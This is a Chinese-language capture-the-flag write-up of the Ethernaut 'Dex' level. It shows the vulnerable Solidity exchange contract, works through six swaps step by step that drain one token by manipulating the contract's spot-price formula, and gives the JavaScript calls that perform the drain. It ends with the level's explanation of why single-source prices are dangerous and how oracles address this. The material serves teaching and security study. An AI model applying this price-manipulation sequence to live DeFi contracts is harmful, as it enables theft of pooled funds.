# Dex

> The goal of this level is for you to hack the basic [DEX](https://en.wikipedia.org/wiki/Decentralized_exchange) contract below and steal the funds by price manipulation.
>
> You will start with 10 tokens of `token1` and 10 of `token2`. The DEX contract starts with 100 of each token.
>
> You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.
>
>  
>
> ### Quick note
>
> Normally, when you make a swap with an ERC20 token, you have to `approve` the contract to spend your tokens for you. To keep with the syntax of the game, we've just added the `approve` method to the contract itself. So feel free to use `contract.approve(contract.address, <uint amount>)` instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the `SwappableToken` contract otherwise.
>
>  Things that might help:
>
> - How is the price of the token calculated?
> - How does the `swap` method work?
> - How do you `approve` a transaction of an ERC20?

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract Dex is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

## 攻击思路

swap的逻辑
$$
((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)))
$$
我初始有10个token1，10个token2，合约有100个token1，100个token2。



第一次swap，我用10个token1换10个token2，因为
$$
(10*100)/100 = 10
$$
第一次swap后，我就有0个token1，20个token2；合约有110个token1，90个token2。



第二次swap，我用20个token2换24个token1，因为
$$
(20*110)/90 = 24
$$
第二次swap后，我就有24个token1，0个token2；合约有86个token1，110个token2。



第三次swap，我用24个token1换30个token2，因为
$$
(24*110)/86 = 30
$$
第三次swap后，我就有0个token1，30个token2；合约有110个token1，80个token2。



第四次swap，我用30个token2换41个token1，因为
$$
(30*110)/80 = 41
$$
第四次swap后，我就有41个token1，0个token2；合约有69个token1，110个token2。



第五次swap，我用41个token1换个token2，因为
$$
(41*110)/69 = 65
$$
第五次swap后，我就有0个token1，65个token2；合约有110个token1，45个token2。



第六次swap，我用45个token2换个110token1，因为
$$
(45*110)/45 = 110
$$
第六次swap后，我就有110个token1，20个token2；合约有0个token1，90个token2。

至此，经过6轮，合约中的token1已经被掏空了。

## 攻击流程

首先，在代币中授权给Dex，

```js
await contract.approve(contract.address,110)

await contract.swap(await contract.token1(), await contract.token2(),10)

await contract.swap(await contract.token2(), await contract.token1(),20)

await contract.swap(await contract.token1(), await contract.token2(),24)

await contract.swap(await contract.token2(), await contract.token1(),30)

await contract.swap(await contract.token1(), await contract.token2(),41)

await contract.swap(await contract.token2(), await contract.token1(),45)
```

成功！

The integer math portion aside, getting prices or any sort of data from any single source is a massive attack vector in smart contracts.

You can clearly see from this example, that someone with a lot of capital could manipulate the price in one fell swoop, and cause any applications relying on it to use the the wrong price.

The exchange itself is decentralized, but the price of the asset is centralized, since it comes from 1 dex. This is why we need [oracles](https://betterprogramming.pub/what-is-a-blockchain-oracle-f5ccab8dbd72?source=friends_link&sk=d921a38466df8a9176ed8dd767d8c77d). Oracles are ways to get data into and out of smart contracts. We should be getting our data from multiple independent decentralized sources, otherwise we can run this risk.

[Chainlink Data Feeds](https://docs.chain.link/docs/get-the-latest-price) are a secure, reliable, way to get decentralized data into your smart contracts. They have a vast library of many different sources, and also offer [secure randomness](https://docs.chain.link/docs/chainlink-vrf), ability to make [any API call](https://docs.chain.link/docs/make-a-http-get-request), [modular oracle network creation](https://docs.chain.link/docs/architecture-decentralized-model), [upkeep, actions, and maintainance](https://docs.chain.link/docs/kovan-keeper-network-beta), and unlimited customization.

[Uniswap TWAP Oracles](https://uniswap.org/docs/v2/core-concepts/oracles/) relies on a time weighted price model called [TWAP](https://en.wikipedia.org/wiki/Time-weighted_average_price#). While the design can be attractive, this protocol heavily depends on the liquidity of the DEX protocol, and if this is too low, prices can be easily manipulated.

Here is an example of getting data from a Chainlink data feed (on the kovan testnet):

```solidity
pragma solidity ^0.6.7;

import "@chainlink/contracts/src/v0.6/interfaces/AggregatorV3Interface.sol";

contract PriceConsumerV3 {

    AggregatorV3Interface internal priceFeed;

    /**
     * Network: Kovan
     * Aggregator: ETH/USD
     * Address: 0x9326BFA02ADD2366b30bacB125260Af641031331
     */
    constructor() public {
        priceFeed = AggregatorV3Interface(0x9326BFA02ADD2366b30bacB125260Af641031331);
    }

    /**
     * Returns the latest price
     */
    function getLatestPrice() public view returns (int) {
        (
            uint80 roundID, 
            int price,
            uint startedAt,
            uint timeStamp,
            uint80 answeredInRound
        ) = priceFeed.latestRoundData();
        return price;
    }
}
```

[Try it on Remix](https://remix.ethereum.org/#version=soljson-v0.6.7+commit.b8d736ae.js&optimize=false&evmVersion=null&gist=0c5928a00094810d2ba01fd8d1083581)
